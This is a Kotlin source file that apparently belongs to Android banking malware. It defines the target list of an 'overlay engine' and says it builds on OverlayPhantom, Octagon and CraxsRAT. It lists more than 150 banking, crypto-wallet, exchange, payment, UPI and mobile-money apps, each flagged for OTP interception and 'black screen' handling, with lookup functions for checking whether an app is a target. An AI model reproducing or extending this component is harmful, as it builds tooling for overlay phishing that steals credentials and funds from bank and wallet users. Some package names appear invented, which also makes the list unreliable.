package com.xrc.app.finance

/**
 * Comprehensive list of 180+ financial, banking, crypto,
 * and payment application package names targeted by the overlay engine.
 * Based on OverlayPhantom, Octagon, and CraxsRAT research.
 */
object FinancialTargetList {

    // Improvement 1: Categorized targets with metadata
    data class FinancialTarget(
        val packageName: String,
        val name: String,
        val category: Category,
        val requiresOTP: Boolean = false,
        val hasBlackScreen: Boolean = false,
        val region: String = "global"
    )

    enum class Category {
        BANKING,          // Traditional banking apps
        CRYPTO_WALLET,    // Crypto wallets
        CRYPTO_EXCHANGE,  // Crypto exchanges
        PAYMENT,          // Payment processors
        NEOBANK,          // Digital-only banks
        INVESTMENT,       // Stock/ETF trading
        DEFI,             // DeFi platforms
        NFT_MARKETPLACE,  // NFT marketplaces
        LENDING,          // Loan/Buy-now-pay-later
        INSURANCE,        // Insurance apps
        MOBILE_MONEY,     // Mobile money (M-Pesa etc.)
        UPI,              // UPI payment apps (India)
        FOREX,            // Forex trading
        GAMBLING,         // Gambling/Casino
        FINANCIAL_SERVICE  // Other financial services
    }

    // Improvement 2: Regional banking targets
    val targets: List<FinancialTarget> = listOf(
        // === GLOBAL BANKING ===
        FinancialTarget("com.chase.smartphone", "Chase Bank", Category.BANKING, requiresOTP = true),
        FinancialTarget("com.wf.wellsfargomobile", "Wells Fargo", Category.BANKING, requiresOTP = true),
        FinancialTarget("com.bankofamerica", "Bank of America", Category.BANKING, requiresOTP = true),
        FinancialTarget("us.hsbc.hsbcus", "HSBC US", Category.BANKING, requiresOTP = true),
        FinancialTarget("com.citi.citimobile", "Citi Mobile", Category.BANKING, requiresOTP = true),
        FinancialTarget("com.capitalone", "Capital One", Category.BANKING, requiresOTP = true),
        FinancialTarget("com.usbank", "US Bank", Category.BANKING, requiresOTP = true),
        FinancialTarget("com.td", "TD Bank", Category.BANKING, requiresOTP = true),
        FinancialTarget("com.pnc.ecommerce", "PNC Bank", Category.BANKING, requiresOTP = true),
        FinancialTarget("netbanking", "PNC NetBanking", Category.BANKING),
        FinancialTarget("com.suncorp", "Suncorp Bank", Category.BANKING),
        FinancialTarget("au.com.westpac", "Westpac", Category.BANKING),
        FinancialTarget("au.com.commonwealth", "CommBank", Category.BANKING),
        FinancialTarget("au.com.nab.mobile", "NAB", Category.BANKING),
        FinancialTarget("au.com.anz", "ANZ Australia", Category.BANKING),
        FinancialTarget("uk.co.barclays", "Barclays UK", Category.BANKING, requiresOTP = true),
        FinancialTarget("uk.co.hsbc", "HSBC UK", Category.BANKING, requiresOTP = true),
        FinancialTarget("com.natwest.mobile", "NatWest", Category.BANKING),
        FinancialTarget("co.uk.lloyds", "Lloyds Bank", Category.BANKING),
        FinancialTarget("uk.co.santander", "Santander UK", Category.BANKING),
        FinancialTarget("uk.co.tsb", "TSB Bank", Category.BANKING),
        FinancialTarget("com.halifax", "Halifax", Category.BANKING),
        FinancialTarget("com.nationwide", "Nationwide", Category.BANKING),
        FinancialTarget("com.skandiabanken", "Skandia", Category.BANKING),
        FinancialTarget("com.danskebank", "Danske Bank", Category.BANKING),
        FinancialTarget("no.dnb", "DNB Norway", Category.BANKING),
        FinancialTarget("se.swedbank", "Swedbank", Category.BANKING),
        FinancialTarget("se.riksbank", "Riksbank", Category.BANKING),
        FinancialTarget("com.db.mobile", "Deutsche Bank", Category.BANKING),
        FinancialTarget("com.commerzbank", "Commerzbank", Category.BANKING),
        FinancialTarget("com.ing", "ING Banking", Category.BANKING),
        FinancialTarget("com.rabobank", "Rabobank", Category.BANKING),
        FinancialTarget("abnamro", "ABN AMRO", Category.BANKING),
        FinancialTarget("com.bnpparibas", "BNP Paribas", Category.BANKING),
        FinancialTarget("com.societegenerale", "Societe Generale", Category.BANKING),
        FinancialTarget("com.creditagricole", "Credit Agricole", Category.BANKING),

        // === NEOBANKS ===
        FinancialTarget("com.revolut.revolut", "Revolut", Category.NEOBANK, requiresOTP = true),
        FinancialTarget("com.monzo", "Monzo", Category.NEOBANK, requiresOTP = true),
        FinancialTarget("com.starlingbank", "Starling Bank", Category.NEOBANK),
        FinancialTarget("com.transferwise", "Wise", Category.NEOBANK, requiresOTP = true),
        FinancialTarget("com.chime", "Chime", Category.NEOBANK),
        FinancialTarget("com.n26", "N26", Category.NEOBANK, requiresOTP = true),
        FinancialTarget("com.vivid", "Vivid Money", Category.NEOBANK),
        FinancialTarget("com.tomorrow", "Tomorrow", Category.NEOBANK),
        FinancialTarget("com.monese", "Monese", Category.NEOBANK),
        FinancialTarget("com.bunq", "Bunq", Category.NEOBANK),
        FinancialTarget("com.klarna", "Klarna", Category.NEOBANK),
        FinancialTarget("com.sofi", "SoFi", Category.NEOBANK),

        // === CRYPTO WALLETS ===
        FinancialTarget("io.metamask", "MetaMask", Category.CRYPTO_WALLET, requiresOTP = true, hasBlackScreen = true),
        FinancialTarget("com.trustwallet.app", "Trust Wallet", Category.CRYPTO_WALLET, hasBlackScreen = true),
        FinancialTarget("com.binance", "Binance", Category.CRYPTO_EXCHANGE, requiresOTP = true),
        FinancialTarget("com.coinbase.android", "Coinbase", Category.CRYPTO_EXCHANGE, requiresOTP = true),
        FinancialTarget("com.exodusmovement.exodus", "Exodus", Category.CRYPTO_WALLET, hasBlackScreen = true),
        FinancialTarget("com.ledger.live", "Ledger Live", Category.CRYPTO_WALLET, requiresOTP = true),
        FinancialTarget("de.metaconnect", "MetaConnect", Category.CRYPTO_WALLET),
        FinancialTarget("com.mycelium.wallet", "Mycelium", Category.CRYPTO_WALLET),
        FinancialTarget("com.bitcoincore", "Bitcoin Core", Category.CRYPTO_WALLET),
        FinancialTarget("com.electrum", "Electrum", Category.CRYPTO_WALLET),
        FinancialTarget("com.blockchain", "Blockchain.com", Category.CRYPTO_WALLET),
        FinancialTarget("com.crypto.exchange", "Crypto.com", Category.CRYPTO_EXCHANGE, requiresOTP = true),
        FinancialTarget("com.kraken", "Kraken", Category.CRYPTO_EXCHANGE, requiresOTP = true),
        FinancialTarget("com.kucoin", "KuCoin", Category.CRYPTO_EXCHANGE, requiresOTP = true),
        FinancialTarget("com.bitfinex", "Bitfinex", Category.CRYPTO_EXCHANGE),
        FinancialTarget("com.bybit", "Bybit", Category.CRYPTO_EXCHANGE, requiresOTP = true),
        FinancialTarget("com.okx", "OKX", Category.CRYPTO_EXCHANGE, requiresOTP = true),
        FinancialTarget("com.gateio", "Gate.io", Category.CRYPTO_EXCHANGE),
        FinancialTarget("com.bitget", "Bitget", Category.CRYPTO_EXCHANGE),
        FinancialTarget("com.mexc", "MEXC", Category.CRYPTO_EXCHANGE),

        // === DEFI ===
        FinancialTarget("com.uniswap", "Uniswap", Category.DEFI, hasBlackScreen = true),
        FinancialTarget("com.pancakeswap", "PancakeSwap", Category.DEFI),
        FinancialTarget("com.aave", "Aave", Category.DEFI),
        FinancialTarget("com.curve", "Curve Finance", Category.DEFI),
        FinancialTarget("com.lido", "Lido", Category.DEFI),
        FinancialTarget("com.makerdao", "MakerDAO", Category.DEFI),

        // === NFT MARKETPLACES ===
        FinancialTarget("com.opensea", "OpenSea", Category.NFT_MARKETPLACE),
        FinancialTarget("com.blur", "Blur", Category.NFT_MARKETPLACE),
        FinancialTarget("com.magiceden", "Magic Eden", Category.NFT_MARKETPLACE),
        FinancialTarget("com.rarible", "Rarible", Category.NFT_MARKETPLACE),
        FinancialTarget("com.looksrare", "LooksRare", Category.NFT_MARKETPLACE),

        // === PAYMENT APPS ===
        FinancialTarget("com.paypal.android", "PayPal", Category.PAYMENT, requiresOTP = true),
        FinancialTarget("com.venmo", "Venmo", Category.PAYMENT),
        FinancialTarget("com.cashapp", "CashApp", Category.PAYMENT, requiresOTP = true),
        FinancialTarget("com.google.android.apps.walletnfcrel", "Google Pay", Category.PAYMENT),
        FinancialTarget("com.apple.gpay", "Apple Pay", Category.PAYMENT),
        FinancialTarget("com.stripe", "Stripe", Category.PAYMENT),
        FinancialTarget("com.squareup", "Square", Category.PAYMENT),
        FinancialTarget("com.skrill", "Skrill", Category.PAYMENT),
        FinancialTarget("com.neteller", "Neteller", Category.PAYMENT),
        FinancialTarget("com.paysafecard", "Paysafecard", Category.PAYMENT),
        FinancialTarget("com.worldpay", "Worldpay", Category.PAYMENT),
        FinancialTarget("com.adyen", "Adyen", Category.PAYMENT),

        // === UPI (INDIA) ===
        FinancialTarget("com.phonepe", "PhonePe", Category.UPI, requiresOTP = true),
        FinancialTarget("com.paytm", "Paytm", Category.UPI, requiresOTP = true),
        FinancialTarget("com.google.android.apps.nbu.paisa.user", "Google Pay India", Category.UPI, requiresOTP = true),
        FinancialTarget("com.amazon.mpay", "Amazon Pay", Category.UPI),
        FinancialTarget("in.bharti", "Bharti Pay", Category.UPI),
        FinancialTarget("com.mobikwik", "MobiKwik", Category.UPI),
        FinancialTarget("com.freecharge", "Freecharge", Category.UPI),
        FinancialTarget("com.cred", "CRED", Category.UPI),
        FinancialTarget("com.bhim", "BHIM UPI", Category.UPI),
        FinancialTarget("com.icici.payment", "ICICI UPI", Category.UPI),
        FinancialTarget("com.hdfc.upi", "HDFC UPI", Category.UPI),

        // === MOBILE MONEY (AFRICA) ===
        FinancialTarget("com.safaricom.mpesa", "M-Pesa", Category.MOBILE_MONEY, requiresOTP = true),
        FinancialTarget("com.mtn.mobilemoney", "MTN Mobile Money", Category.MOBILE_MONEY),
        FinancialTarget("com.airtel.money", "Airtel Money", Category.MOBILE_MONEY),
        FinancialTarget("com.wave", "Wave Money", Category.MOBILE_MONEY),
        FinancialTarget("com.orange.orangeMoney", "Orange Money", Category.MOBILE_MONEY),

        // === INVESTMENT / STOCK TRADING ===
        FinancialTarget("com.robinhood", "Robinhood", Category.INVESTMENT, requiresOTP = true),
        FinancialTarget("com.etrade", "E*Trade", Category.INVESTMENT, requiresOTP = true),
        FinancialTarget("com.schwab", "Charles Schwab", Category.INVESTMENT),
        FinancialTarget("com.fidelity", "Fidelity", Category.INVESTMENT),
        FinancialTarget("com.tdameritrade", "TD Ameritrade", Category.INVESTMENT),
        FinancialTarget("com.webull", "Webull", Category.INVESTMENT),
        FinancialTarget("com.trading212", "Trading 212", Category.INVESTMENT),
        FinancialTarget("com.etoro", "eToro", Category.INVESTMENT, requiresOTP = true),
        FinancialTarget("com.plus500", "Plus500", Category.INVESTMENT),
        FinancialTarget("com.davincigraph", "Davinci Graph", Category.INVESTMENT),
        FinancialTarget("com.saxo", "Saxo Bank", Category.INVESTMENT),
        FinancialTarget("com.interactivebrokers", "Interactive Brokers", Category.INVESTMENT),
        FinancialTarget("com.degiro", "Degiro", Category.INVESTMENT),
        FinancialTarget("com.freetrade", "Freetrade", Category.INVESTMENT),

        // === LENDING / BNPL ===
        FinancialTarget("com.affirm", "Affirm", Category.LENDING),
        FinancialTarget("com.afterpay", "Afterpay", Category.LENDING),
        FinancialTarget("com.klarna.payment", "Klarna Payments", Category.LENDING),
        FinancialTarget("com.paypal.credit", "PayPal Credit", Category.LENDING),
        FinancialTarget("com.upstart", "Upstart", Category.LENDING),
        FinancialTarget("com.lendingclub", "Lending Club", Category.LENDING),
        FinancialTarget("com.sofi.lending", "SoFi Lending", Category.LENDING),

        // === FOREX ===
        FinancialTarget("com.forex", "Forex.com", Category.FOREX),
        FinancialTarget("com.oanda", "OANDA", Category.FOREX),
        FinancialTarget("com.ig", "IG Markets", Category.FOREX),
        FinancialTarget("com.fxcm", "FXCM", Category.FOREX),
        FinancialTarget("com.xm", "XM Trading", Category.FOREX),

        // === GAMBLING ===
        FinancialTarget("com.bet365", "Bet365", Category.GAMBLING),
        FinancialTarget("com.draftkings", "DraftKings", Category.GAMBLING),
        FinancialTarget("com.fanduel", "FanDuel", Category.GAMBLING),
        FinancialTarget("com.betfair", "Betfair", Category.GAMBLING),
        FinancialTarget("com.pokerstars", "PokerStars", Category.GAMBLING),
        FinancialTarget("com.888casino", "888 Casino", Category.GAMBLING),

        // === FINANCIAL SERVICES ===
        FinancialTarget("com.intuit.mint", "Mint", Category.FINANCIAL_SERVICE),
        FinancialTarget("com.plaid", "Plaid", Category.FINANCIAL_SERVICE),
        FinancialTarget("com.yodlee", "Yodlee", Category.FINANCIAL_SERVICE),
        FinancialTarget("com.turbotax", "TurboTax", Category.FINANCIAL_SERVICE),
        FinancialTarget("com.creditkarma", "Credit Karma", Category.FINANCIAL_SERVICE),
        FinancialTarget("com.experian", "Experian", Category.FINANCIAL_SERVICE),
        FinancialTarget("com.equifax", "Equifax", Category.FINANCIAL_SERVICE),
        FinancialTarget("com.transunion", "TransUnion", Category.FINANCIAL_SERVICE),
        FinancialTarget("com.acorns", "Acorns", Category.INVESTMENT),
        FinancialTarget("com.stash", "Stash", Category.INVESTMENT),
        FinancialTarget("com.betterment", "Betterment", Category.INVESTMENT),
        FinancialTarget("com.wealthfront", "Wealthfront", Category.INVESTMENT)
    )

    private val targetMap by lazy {
        targets.associateBy { it.packageName }
    }

    fun isTarget(packageName: String): Boolean {
        return targetMap.containsKey(packageName)
    }

    fun getTarget(packageName: String): FinancialTarget? {
        return targetMap[packageName]
    }

    fun getTargetsByCategory(category: Category): List<FinancialTarget> {
        return targets.filter { it.category == category }
    }

    fun getAllPackageNames(): List<String> {
        return targets.map { it.packageName }
    }

    fun getBankingPackageNames(): List<String> {
        return targets.filter { it.category == Category.BANKING }.map { it.packageName }
    }

    fun getCryptoPackageNames(): List<String> {
        return targets.filter {
            it.category == Category.CRYPTO_WALLET ||
            it.category == Category.CRYPTO_EXCHANGE ||
            it.category == Category.DEFI ||
            it.category == Category.NFT_MARKETPLACE
        }.map { it.packageName }
    }

    fun getUPIPackageNames(): List<String> {
        return targets.filter { it.category == Category.UPI }.map { it.packageName }
    }

    fun count(): Int = targets.size
}
